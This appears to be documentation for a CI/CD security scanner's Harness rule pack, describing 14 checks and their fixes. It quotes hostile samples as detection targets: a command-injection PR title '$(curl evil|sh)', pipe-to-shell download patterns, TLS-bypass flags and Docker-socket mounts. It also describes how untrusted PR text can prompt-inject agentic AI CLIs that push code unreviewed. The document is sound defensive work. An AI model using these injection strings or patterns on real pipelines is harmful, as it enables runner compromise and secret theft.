# Harness CI/CD provider

Parses Harness pipeline YAML (the Git Experience / pipeline-as-code
form) on disk. Harness has no canonical filename, so the loader globs
``*.yml`` / ``*.yaml`` and keeps the documents whose top-level key is
``pipeline:`` (its discriminator); a ``template:`` document or
unrelated YAML in the same directory is skipped. A pipeline nests
steps several levels deep (``stages`` -> ``stage.spec.execution.steps``
-> ``step`` / ``parallel`` / ``stepGroup``); the rule pack flattens
all of that and scans every leaf step across CI and CD stages.

## Producer workflow

```bash
# --harness-path is auto-detected when a .harness/ directory exists at cwd.
pipeline_check --pipeline harness

# ...or pass it explicitly (a file or a directory of pipelines).
pipeline_check --pipeline harness --harness-path .harness/

pipeline_check --pipeline harness --harness-path pipelines/build.yaml
```

All other flags (`--output`, `--severity-threshold`, `--checks`,
`--standard`, ...) behave the same as with the other providers.

### Harness-specific checks

- **HARNESS-002**, Harness substitutes a ``<+...>`` expression's text
  into a step ``command`` *before* the shell runs it, so an
  attacker-controllable expression (``<+codebase.prTitle>``,
  ``<+codebase.commitMessage>``, a branch / tag name, or any
  ``<+trigger.*>`` / ``<+eventPayload.*>`` value) is a command-injection
  primitive. ``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` are
  excluded (not injectable text). Bind the value to an ``envVariables``
  entry and quote it (``"$PR_TITLE"``) to clear the finding. Same model
  as GHA-002 / GL-002 / DR-003 in this catalog.

## What it covers

14 checks · 3 have an autofix patch (``--fix``).

| Check | Title | Severity | Fix |
|-------|-------|----------|-----|
| [HARNESS-001](#harness-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-002](#harness-002) | Untrusted Harness expression interpolated into a step command | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-003](#harness-003) | Step runs with privileged: true | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-004](#harness-004) | Literal credential in a pipeline / stage variable | <span class="pg-sev pg-sev--critical">CRITICAL</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [HARNESS-005](#harness-005) | Step pipes a remote download into a shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [HARNESS-006](#harness-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [HARNESS-007](#harness-007) | Stage infrastructure mounts a sensitive host path | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-008](#harness-008) | Untrusted context reaches an agentic AI CLI (prompt injection) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-009](#harness-009) | Agentic CLI output lands without human review | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-010](#harness-010) | ML model loaded with trust_remote_code (code execution) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-011](#harness-011) | Unsafe deserialization of a fetched artifact (pickle RCE) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-012](#harness-012) | AI model pulled without a pinned revision | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [HARNESS-013](#harness-013) | Secret-named variable echoed / printed in a step command | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [HARNESS-014](#harness-014) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> |  |

---

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-001: Step image not pinned to a digest { #harness-001 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Detection mirrors the DR-001 / GL-001 / CC-003 family over Harness's nested step model: every ``Run`` / ``Plugin`` / ``Background`` (and any custom) step that declares a ``spec.image`` whose ref does not end in ``@sha256:<64 hex>`` fires, across CI and CD stages and through ``parallel`` / ``stepGroup`` nesting. Steps with no ``spec.image`` (built-in steps like ``BuildAndPushDockerRegistry`` / ``RestoreCacheS3``) pass-by-default. ``:latest`` and missing-tag refs emit the strongest message; a version tag (``node:18.19.0``) still fires but is a one-line digest swap.

**Known false-positive modes**

- An image built earlier in the same pipeline and referenced by a deliberately-floating internal tag can't always be digest-pinned. Suppress via an ignore-file scoped to that step; the floating-tag risk still applies to every public-registry pull.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every step ``image:`` to ``@sha256:<digest>``. Harness resolves the image ref at run time, so a tag like ``node:18`` resolves against whatever the registry currently serves, and a compromised registry (or a moved tag) can swap content under a fixed tag. Capture the digest once with ``crane digest node:18`` (or ``docker buildx imagetools inspect node:18``) and bump it deliberately when the upstream version moves.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-002: Untrusted Harness expression interpolated into a step command { #harness-002 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
</div>

The Harness analog of GHA-002 / GL-002 script injection. Fires when a step's ``spec.command`` text contains a ``<+...>`` expression that resolves to outside-contributor input: the ``codebase`` identity / ref / title / message fields (``gitUser``, ``branch``, ``sourceBranch``, ``targetBranch``, ``tag``, ``prTitle``, ``commitMessage``, ...) or the whole ``trigger.`` / ``eventPayload.`` webhook context. ``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` are excluded (not injectable text). Detection is purely on the expression namespace, so it does not depend on the trigger type; binding the value to an env var and quoting it clears the finding.

<div class="pg-rule__rec" markdown>

**Recommended action**

Never paste an attacker-controllable Harness expression (``<+codebase.prTitle>``, ``<+codebase.commitMessage>``, a branch / tag name, or any ``<+trigger.*>`` / ``<+eventPayload.*>`` value) straight into a ``Run`` step ``command``. Harness substitutes the expression's text into the script before the shell runs it, so a pull request titled ``$(curl evil|sh)`` executes on your runner. Pass the value through an environment variable instead (``envVariables: { PR_TITLE: <+codebase.prTitle> }`` then use ``"$PR_TITLE"`` quoted in the script), which makes the shell treat it as data, not code.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-003: Step runs with privileged: true { #harness-003 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--esf">ESF-D-LEAST-PRIV</span> <span class="pg-tag pg-tag--cwe">CWE-269</span> <span class="pg-tag pg-tag--cwe">CWE-250</span>
</div>

Harness CI ``Run`` / ``Background`` steps accept a ``spec.privileged: true`` flag that maps to ``docker run --privileged`` on the build pod / VM. The rule fires on any step (across CI and CD stages, through ``parallel`` / ``stepGroup`` nesting) whose ``spec.privileged`` is truthy. Same model as DR-002 / BK-006 in this catalog.

<div class="pg-rule__rec" markdown>

**Recommended action**

Drop ``privileged: true`` from the step. The flag removes the container's syscall and capability boundary, giving the step kernel-level access to the build host. Most workloads that reach for it are Docker-in-Docker builds that can use a rootless alternative (``kaniko``, ``buildah --isolation=chroot``, BuildKit rootless) instead. If a genuine syscall is needed, scope it down with explicit added capabilities on an isolated build-infra pool rather than blanket privileged mode.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## HARNESS-004: Literal credential in a pipeline / stage variable { #harness-004 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span> <span class="pg-tag pg-tag--cwe">CWE-321</span>
</div>

Fires on a pipeline-level or stage-level ``variables:`` entry whose ``value`` is a credential-shaped literal (matched by the shared secret-shape catalog, ``find_secret_values``) rather than a ``<+secrets.getValue(...)>`` expression. ``type: Secret`` variables and any ``<+...>`` expression value are skipped (those are managed references, not literals); empty values are ignored. The value is redacted in the finding. Same value-shape model as the literal-secret rules across the other providers (DR-004 / BK-002 / TKN-005).

<div class="pg-rule__rec" markdown>

**Recommended action**

Move the credential into a Harness secret and reference it as an expression instead of a literal: declare the variable with ``type: Secret`` and a value of ``<+secrets.getValue("my_secret")>`` (or store it in the built-in / a connected secret manager). Harness masks secret-expression values in logs but does not mask a literal pasted into a ``type: String`` variable, so the token ends up in the pipeline definition and the run logs indefinitely. Rotate any credential already committed this way.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-005: Step pipes a remote download into a shell interpreter { #harness-005 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
</div>

Walks every step's ``spec.command`` text and fires on the canonical pipe-to-shell shapes (``curl ... | sh`` / ``| bash``, ``wget ... -O - | sh``, ``fetch ... | sh``), allowing arbitrary intermediate flags so ``curl -fsSL <url> | sh -s -- --foo`` still matches. The download-then-execute form (``curl <url> -o f && sh f``) is NOT caught: the file lands on disk first, leaving room for a checksum-verify step. Same model as DR-014 / GHA-016 / BK-017 / TKN-008 across providers.

**Known false-positive modes**

- Some vendor install scripts (rustup, nvm) ship pipe-to-shell as the canonical path. The rule fires anyway, since upstream reputation doesn't remove the MITM / compromised-domain risk. Suppress per step with a rationale naming the upstream.

**Seen in the wild**

- Codecov bash uploader (April 2021): downstream builds using ``curl -fsSL https://codecov.io/bash | bash`` shipped a tampered uploader for two months. https://about.codecov.io/security-update/

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace every ``curl ... | sh`` / ``wget ... | bash`` pattern in a Run step ``command`` with a download-verify-execute flow: download the artifact to disk (``curl -fsSL -o installer.sh <url>``), verify a known-good checksum against the file (``echo "<sha256>  installer.sh" | sha256sum -c -``), and only then run it (``sh installer.sh``). The pipe-to-shell pattern executes whatever bytes the URL serves at run time with the step container's privileges and secrets, so a network MITM, a compromised mirror, or a brief upstream takeover injects arbitrary code into the build with no verification step.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-006: TLS verification disabled in step commands { #harness-006 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--cwe">CWE-295</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
</div>

Reuses the cross-provider ``_primitives.tls_bypass`` detector shared with DR-006 / GHA-027 / BK-008 / JF-022 / ADO-026 / CC-024 / GCB-011 and the IaC packs (covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses). The rule scans every step's ``spec.command`` text across CI and CD stages, through ``parallel`` / ``stepGroup`` nesting.

<div class="pg-rule__rec" markdown>

**Recommended action**

Remove TLS-bypass flags from the step command. The common offenders are ``curl --insecure`` / ``-k``, ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, and ``git -c http.sslVerify=false``. Each exposes the build to a TLS-MITM injection of a registry-served payload, a textbook supply-chain vector. If a registry's certificate is genuinely broken, install the missing CA into the build image and fix the registry rather than disabling verification, which tends to outlive the broken cert and become a permanent weakness.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-007: Stage infrastructure mounts a sensitive host path { #harness-007 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-D-RUNTIME-HARDENING</span> <span class="pg-tag pg-tag--esf">ESF-D-LEAST-PRIV</span> <span class="pg-tag pg-tag--cwe">CWE-250</span> <span class="pg-tag pg-tag--cwe">CWE-732</span>
</div>

Harness CI Kubernetes infrastructure (``stage.spec.infrastructure.spec.volumes``) accepts ``EmptyDir`` / ``PersistentVolumeClaim`` (safe) or ``HostPath`` (a bind mount of the build node's filesystem, the dangerous shape). The rule fires when a ``HostPath`` volume's ``spec.path`` matches a sensitive prefix: ``/var/run/docker.sock`` (the canonical container-escape socket), ``/var/lib/docker``, ``/var/run``, ``/etc``, ``/proc``, ``/sys``, or ``/`` (full host root). ``EmptyDir`` / PVC volumes pass. Same model as DR-007 / K8S-019 across providers.

**Known false-positive modes**

- Trusted-only pipelines on a dedicated, isolated build cluster sometimes deliberately mount the Docker socket for image build / push. Suppress via ignore-file when the cluster's isolation is documented; the rule can't see the cluster's trust boundary from the pipeline YAML alone.

<div class="pg-rule__rec" markdown>

**Recommended action**

Drop the ``HostPath`` volume from the stage infrastructure. Mounting ``/var/run/docker.sock`` from the build node into the build pod hands it root-equivalent control over every other workload on that node (it can launch arbitrary, including privileged, containers). ``/var/lib/docker`` exposes every image and container on the node, ``/proc`` and ``/sys`` expose host kernel state, and ``/`` is full host takeover. If the build genuinely needs container builds, use a rootless builder (``kaniko``, ``buildah --isolation=chroot``, BuildKit rootless) or a remote builder, rather than bind-mounting the node's filesystem.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-008: Untrusted context reaches an agentic AI CLI (prompt injection) { #harness-008 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-77</span>
</div>

The AI analog of HARNESS-002 (shell injection). Fires when a step ``spec.command`` invokes an agentic CLI (claude / gemini / cursor-agent / aider / openhands / goose / ``q chat``) AND an attacker-controllable ``<+...>`` expression reaches it (the ``codebase`` identity / ref / title / message fields or the whole ``trigger.`` / ``eventPayload.`` webhook context; the same taint set as HARNESS-002, ``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` excluded). Separate from HARNESS-002 because an LLM ingests the value as prompt text regardless of shell quoting / env-var binding, so the shell-injection mitigation does not apply.

<div class="pg-rule__rec" markdown>

**Recommended action**

Do not place attacker-controllable Harness context (``<+codebase.prTitle>``, ``<+codebase.commitMessage>``, a branch / tag name, or any ``<+trigger.*>`` / ``<+eventPayload.*>`` value) in an agentic CLI's prompt. Binding the value to an env var does NOT sanitize a prompt the way it does a shell command, the model still reads it. If the agent must see PR content, run it in a stage with no secrets bound and no tool / shell access, and treat its output as untrusted.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-009: Agentic CLI output lands without human review { #harness-009 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-C-APPROVAL</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-693</span>
</div>

Fires when one pipeline both invokes an agentic CLI (``claude`` / ``gemini`` / ``cursor-agent`` / ``aider`` / ``openhands`` / ``goose`` / ``q chat``) in a step ``command`` and, in the same pipeline, lands the result with a ``git push`` (the Harness idiom for committing straight to a branch). Coupling is pipeline-level because the stages of one Harness pipeline share the cloned codebase. Does NOT fire when the agent only opens a pull request for review, nor on a push step that runs no agent. A ``git push --dry-run`` is ignored. The Harness analog of GHA-123 / GL-049 / BB-039 / ADO-038 / JF-038; with HARNESS-008 it composes the AC-040 injection -> autoland chain.

<div class="pg-rule__rec" markdown>

**Recommended action**

Don't let an agentic CLI's output reach a branch without a human review gate. Have the agent open a normal pull request (no auto-merge) so a person reviews the diff before it lands, and don't pair the agent with a ``git push`` straight to a branch in the same pipeline. If the agent's prompt can be influenced by untrusted input (a PR title / branch, a ``<+trigger.*>`` value), treat the committed result as attacker-controlled (HARNESS-008).

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-010: ML model loaded with trust_remote_code (code execution) { #harness-010 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Fires on ``trust_remote_code=True`` / ``--trust-remote-code`` in a step ``command`` (the shared ``model_trust`` detector, with GHA-120 / GL-045 / BB-035 / ADO-034). The transformers / huggingface_hub loader executes the model repo's own Python at load time, so an untrusted or unpinned model is arbitrary code execution in the pipeline with the run's secrets and connectors in scope.

<div class="pg-rule__rec" markdown>

**Recommended action**

Load models with ``trust_remote_code=False`` (the library default). If a model genuinely needs custom code, vet it and pin an exact revision (a commit SHA, not a tag or branch), run the load in an isolated stage with no production secrets, and prefer safetensors weights over pickle.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-011: Unsafe deserialization of a fetched artifact (pickle RCE) { #harness-011 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--cwe">CWE-502</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Reuses the shared ``unsafe_deser`` detector (with GHA-122 / GL-047 / BB-037 / ADO-036) over each step's ``command``. Fires in two shapes: (A) an explicit unsafe opt-in (``weights_only=False`` on a load, or ``allow_pickle=True`` on ``numpy.load``), always; and (B) a remote fetch (``curl`` / ``wget`` / ``hf_hub_download`` / ``snapshot_download`` / ``huggingface-cli download`` / ``requests.get`` / ``urlretrieve``) together with a pickle-backed loader (``torch.load`` / ``pickle.load(s)`` / ``joblib.load``) in the same step, with no safe path (``weights_only=True`` / safetensors). A bare local unpickle with no fetch does not fire.

<div class="pg-rule__rec" markdown>

**Recommended action**

Don't deserialize a downloaded artifact through pickle. Load weights with safetensors, or pass ``weights_only=True`` to ``torch.load`` (the PyTorch 2.6+ default) so only tensors, not arbitrary Python, are unpickled. Drop ``allow_pickle=True`` from ``numpy.load``. If a pickle / joblib artifact is unavoidable, pin and verify its source (a pinned revision, a checksum, a signature) and load it in an isolated stage with no production secrets.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## HARNESS-012: AI model pulled without a pinned revision { #harness-012 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Fires on a step ``command`` that fetches a model by a mutable registry reference and supplies no revision pin (the shared ``model_ref`` detector, with GHA-121 / GL-046 / BB-038 / ADO-037). Detected fetch forms: ``from_pretrained("org/model")``, ``hf_hub_download`` / ``snapshot_download`` with a ``org/model`` repo id, and ``huggingface-cli download org/model`` / ``hf download org/model``.

Does NOT fire when a revision is pinned in the same step (``revision='<sha>'`` / ``--revision <sha>``), when the reference is a local path (``./model``, ``/models/x``) or a variable / ``<+...>`` expression (the value can't be judged statically), or on a bare single-segment canonical hub name (``bert-base-uncased``) that has no ``org/`` namespace, since those are first-party and the org-scoped third-party models are the higher-risk surface.

**Known false-positive modes**

- A team that re-pulls its own org's model on every run may treat the latest revision as intentional. The right fix is still to pin the revision (it makes an upstream compromise visible); if a rolling pull is genuinely wanted, suppress on the specific step with a rationale naming the model and who controls it.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin the model to an immutable revision. Pass an exact commit ``revision=`` to ``from_pretrained`` / ``hf_hub_download`` / ``snapshot_download`` (a 40-char commit SHA, not a branch or a tag, both of which the owner can move), or ``--revision <sha>`` to ``huggingface-cli download``. A pinned revision is what makes a swapped-weights or swapped-loader-code attack show up as a diff in your repo instead of silently landing on the next build. Pair with ``trust_remote_code=False`` (HARNESS-010) and prefer safetensors weights over pickle.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-013: Secret-named variable echoed / printed in a step command { #harness-013 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-532</span> <span class="pg-tag pg-tag--cwe">CWE-200</span>
</div>

Scans every step ``command`` for a secret-named variable handed to ``echo`` / ``printf`` / ``cat`` / ``tee``, for an ``env`` / ``printenv`` dump, and for ``set -x`` with a secret-named variable in scope (the shared ``log_leak`` detector, with GHA-033 / GL-036 / BB-032 / ADO-031 / CC-032 / JF-042). Variable names matching common secret patterns (PASSWORD / TOKEN / SECRET / API_KEY / CREDENTIAL) trigger the rule. The Harness analog of GL-036 / CC-032.

<div class="pg-rule__rec" markdown>

**Recommended action**

Don't print secret values in step commands. Harness masks resolved ``<+secrets.getValue(...)>`` values in the log, but only the exact resolved string. Encoded, truncated, or derived forms bypass the mask, and ``set -x`` / ``env`` / ``printenv`` dump the raw value before masking can catch it. Log a boolean instead (``[ -n "$TOKEN" ] && echo set || echo unset``), and avoid ``set -x`` while a credential variable is in scope.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## HARNESS-014: Dangerous shell idiom (eval, sh -c variable, backtick exec) { #harness-014 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-95</span>
</div>

Complements HARNESS-002 (untrusted ``<+codebase.*>`` / ``<+trigger.*>`` expression in a step command). This rule fires on intrinsically risky idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted, because the idiom hands a value full shell-grammar reach. Uses the shared ``_primitives.shell_eval`` detector over each step ``command``. The Harness analog of GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / BK-016 / DR-017.

**Known false-positive modes**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary.

</div>

</div>

---

## Adding a new Harness CI/CD check

1. Create a new module at
   `pipeline_check/core/checks/harness/rules/NNN_<name>.py`
   exporting a top-level `RULE = Rule(...)` and a `check(path, doc) -> Finding`
   function. The orchestrator auto-discovers `RULE` and calls `check`
   with the parsed YAML document.
2. Add a mapping for the new ID in
   `pipeline_check/core/standards/data/owasp_cicd_top_10.py` (and any
   other standard that applies).
3. Drop unsafe/safe snippets at
   `tests/fixtures/per_check/harness/-NNN.{unsafe,safe}.yml`
   and add a `CheckCase` entry in
   `tests/test_per_check_real_examples.py::CASES`.
4. Regenerate this doc:

   ```bash
   python scripts/gen_provider_docs.py harness
   ```
